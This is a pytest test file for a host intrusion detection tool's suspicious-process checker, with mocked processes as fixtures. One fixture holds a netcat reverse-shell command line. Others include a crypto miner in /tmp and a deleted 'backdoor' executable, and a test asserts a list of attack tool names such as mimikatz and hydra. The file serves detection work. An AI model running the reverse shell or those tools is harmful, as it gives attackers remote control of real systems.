"""Tests for process monitoring and suspicious process detection."""

import json
from unittest.mock import MagicMock, patch

import pytest

import sys
sys.path.insert(0, str(__file__).replace("/tests/test_process_monitoring.py", "/src"))

from hids_mcp.server import (
    check_suspicious_processes,
    SUSPICIOUS_PROCESS_NAMES,
    SUSPICIOUS_PATHS,
)


class TestCheckSuspiciousProcesses:
    """Tests for check_suspicious_processes function."""

    @pytest.mark.asyncio
    async def test_returns_valid_json(self):
        """Test that function returns valid JSON."""
        result = await check_suspicious_processes()
        data = json.loads(result)

        assert isinstance(data, dict)
        assert "success" in data

    @pytest.mark.asyncio
    async def test_returns_success(self):
        """Test that function returns success."""
        result = await check_suspicious_processes()
        data = json.loads(result)

        assert data["success"] is True

    @pytest.mark.asyncio
    async def test_returns_process_count(self):
        """Test that total process count is returned."""
        result = await check_suspicious_processes()
        data = json.loads(result)

        assert "total_processes" in data
        assert data["total_processes"] >= 0

    @pytest.mark.asyncio
    async def test_returns_suspicious_count(self):
        """Test that suspicious process count is returned."""
        result = await check_suspicious_processes()
        data = json.loads(result)

        assert "suspicious_count" in data
        assert data["suspicious_count"] >= 0

    @pytest.mark.asyncio
    async def test_returns_risk_level(self):
        """Test that risk level is returned."""
        result = await check_suspicious_processes()
        data = json.loads(result)

        assert "risk_level" in data
        assert data["risk_level"] in ["low", "medium", "high"]

    @pytest.mark.asyncio
    async def test_returns_recommendations(self):
        """Test that recommendations are provided."""
        result = await check_suspicious_processes()
        data = json.loads(result)

        assert "recommendations" in data
        assert isinstance(data["recommendations"], list)


class TestSuspiciousProcessDetection:
    """Tests for suspicious process detection with mocked data."""

    @pytest.fixture
    def mock_psutil_normal(self):
        """Mock psutil with normal processes only."""
        mock_procs = [
            MagicMock(info={
                'pid': 1,
                'name': 'systemd',
                'username': 'root',
                'exe': '/lib/systemd/systemd',
                'cmdline': ['/lib/systemd/systemd'],
                'status': 'running'
            }),
            MagicMock(info={
                'pid': 100,
                'name': 'sshd',
                'username': 'root',
                'exe': '/usr/sbin/sshd',
                'cmdline': ['/usr/sbin/sshd', '-D'],
                'status': 'running'
            }),
            MagicMock(info={
                'pid': 200,
                'name': 'nginx',
                'username': 'www-data',
                'exe': '/usr/sbin/nginx',
                'cmdline': ['nginx: master process'],
                'status': 'running'
            }),
        ]
        return mock_procs

    @pytest.fixture
    def mock_psutil_suspicious(self):
        """Mock psutil with suspicious processes."""
        mock_procs = [
            # Normal process
            MagicMock(info={
                'pid': 1,
                'name': 'systemd',
                'username': 'root',
                'exe': '/lib/systemd/systemd',
                'cmdline': ['/lib/systemd/systemd'],
                'status': 'running'
            }),
            # Netcat - suspicious name
            MagicMock(info={
                'pid': 1001,
                'name': 'nc',
                'username': 'www-data',
                'exe': '/usr/bin/nc',
                'cmdline': ['nc', '-e', '/bin/sh', '10.0.0.1', '4444'],
                'status': 'running'
            }),
            # Crypto miner in /tmp - suspicious path
            MagicMock(info={
                'pid': 1002,
                'name': 'xmrig',
                'username': 'nobody',
                'exe': '/tmp/xmrig',
                'cmdline': ['/tmp/xmrig', '-o', 'pool.crypto.com'],
                'status': 'running'
            }),
            # Hidden process
            MagicMock(info={
                'pid': 1003,
                'name': '.hidden',
                'username': 'root',
                'exe': '/var/tmp/.hidden',
                'cmdline': ['/var/tmp/.hidden'],
                'status': 'running'
            }),
        ]
        return mock_procs

    @pytest.mark.asyncio
    async def test_detect_suspicious_by_name(self, mock_psutil_suspicious):
        """Test detection of suspicious processes by name."""
        with patch('psutil.process_iter', return_value=mock_psutil_suspicious):
            result = await check_suspicious_processes()
            data = json.loads(result)

            assert data["suspicious_count"] >= 2  # nc and xmrig

            # Check that netcat is flagged
            suspicious_names = [p["name"] for p in data["suspicious_processes"]]
            assert "nc" in suspicious_names or any("nc" in n for n in suspicious_names)

    @pytest.mark.asyncio
    async def test_detect_suspicious_by_path(self, mock_psutil_suspicious):
        """Test detection of suspicious processes by path."""
        with patch('psutil.process_iter', return_value=mock_psutil_suspicious):
            result = await check_suspicious_processes()
            data = json.loads(result)

            # Check that /tmp/ path is flagged
            for proc in data["suspicious_processes"]:
                if proc.get("exe", "").startswith("/tmp/"):
                    assert "reasons" in proc
                    assert any("suspicious path" in r.lower() for r in proc["reasons"])

    @pytest.mark.asyncio
    async def test_detect_hidden_process(self, mock_psutil_suspicious):
        """Test detection of hidden processes (starting with .)."""
        with patch('psutil.process_iter', return_value=mock_psutil_suspicious):
            result = await check_suspicious_processes()
            data = json.loads(result)

            hidden_procs = [p for p in data["suspicious_processes"] if p["name"].startswith(".")]
            assert len(hidden_procs) >= 1

    @pytest.mark.asyncio
    async def test_no_suspicious_normal_traffic(self, mock_psutil_normal):
        """Test no false positives on normal processes."""
        with patch('psutil.process_iter', return_value=mock_psutil_normal):
            result = await check_suspicious_processes()
            data = json.loads(result)

            assert data["suspicious_count"] == 0
            assert data["risk_level"] == "low"

    @pytest.mark.asyncio
    async def test_high_risk_when_suspicious(self, mock_psutil_suspicious):
        """Test risk level is high when suspicious processes found."""
        with patch('psutil.process_iter', return_value=mock_psutil_suspicious):
            result = await check_suspicious_processes()
            data = json.loads(result)

            assert data["risk_level"] == "high"

    @pytest.mark.asyncio
    async def test_suspicious_process_details(self, mock_psutil_suspicious):
        """Test suspicious process details are captured."""
        with patch('psutil.process_iter', return_value=mock_psutil_suspicious):
            result = await check_suspicious_processes()
            data = json.loads(result)

            for proc in data["suspicious_processes"]:
                assert "pid" in proc
                assert "name" in proc
                assert "reasons" in proc


class TestSuspiciousProcessIndicators:
    """Tests for suspicious process indicator definitions."""

    def test_suspicious_names_defined(self):
        """Test SUSPICIOUS_PROCESS_NAMES is defined."""
        assert isinstance(SUSPICIOUS_PROCESS_NAMES, list)
        assert len(SUSPICIOUS_PROCESS_NAMES) > 0

    def test_suspicious_names_include_key_tools(self):
        """Test key suspicious tools are included."""
        expected_tools = ["nc", "netcat", "xmrig", "mimikatz", "hydra"]

        for tool in expected_tools:
            assert tool in SUSPICIOUS_PROCESS_NAMES

    def test_suspicious_paths_defined(self):
        """Test SUSPICIOUS_PATHS is defined."""
        assert isinstance(SUSPICIOUS_PATHS, list)
        assert len(SUSPICIOUS_PATHS) > 0

    def test_suspicious_paths_include_temp_dirs(self):
        """Test temp directories are included."""
        expected_paths = ["/tmp/", "/dev/shm/", "/var/tmp/"]

        for path in expected_paths:
            assert path in SUSPICIOUS_PATHS


class TestProcessMonitoringEdgeCases:
    """Tests for edge cases in process monitoring."""

    @pytest.fixture
    def mock_psutil_with_errors(self):
        """Mock psutil with processes that raise exceptions."""
        import psutil as ps

        good_proc = MagicMock(info={
            'pid': 1,
            'name': 'systemd',
            'username': 'root',
            'exe': '/lib/systemd/systemd',
            'cmdline': ['/lib/systemd/systemd'],
            'status': 'running'
        })

        # Process that raises NoSuchProcess when accessed
        bad_proc = MagicMock()
        bad_proc.info = property(lambda self: (_ for _ in ()).throw(ps.NoSuchProcess(999)))

        return [good_proc]

    @pytest.mark.asyncio
    async def test_handles_process_exceptions(self, mock_psutil_with_errors):
        """Test graceful handling of process access errors."""
        with patch('psutil.process_iter', return_value=mock_psutil_with_errors):
            # Should not raise exception
            result = await check_suspicious_processes()
            data = json.loads(result)

            assert data["success"] is True

    @pytest.fixture
    def mock_psutil_deleted_exe(self):
        """Mock psutil with deleted executable."""
        mock_procs = [
            MagicMock(info={
                'pid': 1001,
                'name': 'suspicious',
                'username': 'nobody',
                'exe': '/tmp/malware (deleted)',
                'cmdline': ['/tmp/malware'],
                'status': 'running'
            }),
        ]
        return mock_procs

    @pytest.mark.asyncio
    async def test_detect_deleted_executable(self, mock_psutil_deleted_exe):
        """Test detection of processes with deleted executables."""
        with patch('psutil.process_iter', return_value=mock_psutil_deleted_exe):
            result = await check_suspicious_processes()
            data = json.loads(result)

            assert data["suspicious_count"] >= 1
            # Should flag deleted executable
            proc = data["suspicious_processes"][0]
            assert any("deleted" in r.lower() for r in proc["reasons"])

    @pytest.fixture
    def mock_psutil_shell_command(self):
        """Mock psutil with shell command execution."""
        mock_procs = [
            MagicMock(info={
                'pid': 1001,
                'name': 'python',
                'username': 'www-data',
                'exe': '/usr/bin/python3',
                'cmdline': ['python', '-c', 'import subprocess; subprocess.run(["curl", "http://example.com"])'],
                'status': 'running'
            }),
        ]
        return mock_procs

    @pytest.mark.asyncio
    async def test_detect_shell_command_execution(self, mock_psutil_shell_command):
        """Test detection of suspicious shell command execution."""
        with patch('psutil.process_iter', return_value=mock_psutil_shell_command):
            result = await check_suspicious_processes()
            data = json.loads(result)

            # Should detect shell command execution pattern
            if data["suspicious_count"] > 0:
                proc = data["suspicious_processes"][0]
                # May have shell execution reason
                assert "reasons" in proc


class TestProcessSeverityLevels:
    """Tests for process severity level assignment."""

    @pytest.fixture
    def mock_psutil_high_severity(self):
        """Mock process that should trigger high severity."""
        mock_procs = [
            MagicMock(info={
                'pid': 1001,
                'name': 'backdoor',
                'username': 'root',
                'exe': '/tmp/backdoor (deleted)',
                'cmdline': ['/tmp/backdoor'],
                'status': 'running'
            }),
        ]
        return mock_procs

    @pytest.mark.asyncio
    async def test_deleted_exe_high_severity(self, mock_psutil_high_severity):
        """Test deleted executable triggers high severity."""
        with patch('psutil.process_iter', return_value=mock_psutil_high_severity):
            result = await check_suspicious_processes()
            data = json.loads(result)

            if data["suspicious_count"] > 0:
                proc = data["suspicious_processes"][0]
                assert proc.get("severity") == "high"
